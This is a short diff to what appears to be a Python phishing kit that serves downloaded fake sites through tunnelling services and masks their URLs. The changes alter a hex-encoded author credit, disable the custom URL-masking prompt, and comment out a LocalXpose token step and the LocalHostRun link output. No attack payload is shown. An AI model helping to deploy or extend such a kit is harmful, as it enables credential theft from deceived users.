@@ -92,7 +92,7 @@ logo = f"""
 {red}             | |    | | | | \__ \ | | |  __/ |   
 {yellow}             |_|    |_| |_|_|___/_| |_|\___|_|   
 {green}              {" "*19}       
-{cyan}               {" "*11}     {red}[By \x56\x69\x6e\x61\x79\x20\x61\x6e\x64\x20\x43\x68\x61\x69\x74\x61\x6e\x79\x61]
+{cyan}               {" "*11}     {red}[By \x56\x69\x6e\x61\x79\x20\x61\x6e\x64\x20\x43\x68\x61\x69\x74\x68\x61\x6e\x79\x61\x20\x52\x61\x6A]
 """
 
 
@@ -952,7 +952,7 @@ def about():
 # Optional function for url masking
 def masking(url):
     global kshrt
-    cust = input(f"\n{ask}{bcyan}Wanna try custom link? {green}[{blue}y/N/help] : {yellow}")
+    cust ='n' # input(f"\n{ask}{bcyan}Wanna try custom link? {green}[{blue}y/N/help] : {yellow}")
     if cust in [ "", "n", "N", "no" ]:
         return
     if cust == "help":
@@ -1173,7 +1173,7 @@ def requirements():
         extract("websites.zip", sites_dir)
         remove("websites.zip")
     if mode != "test":
-        lx_token()
+        #lx_token()
         ssh_key()
     email_config = cat(email_file)
     if is_json(email_config):
@@ -1356,8 +1356,10 @@ def server():
             url_manager(cf_url, "CloudFlared")
         if lx_success:
             url_manager(lx_url, "LocalXpose")
+        """
         if lhr_success:
             url_manager(lhr_url, "LocalHostRun")
+        """
         if svo_success:
             url_manager(svo_url, "Serveo")
         if lx_success and tunneler.lower() in [ "loclx", "lx" ]:
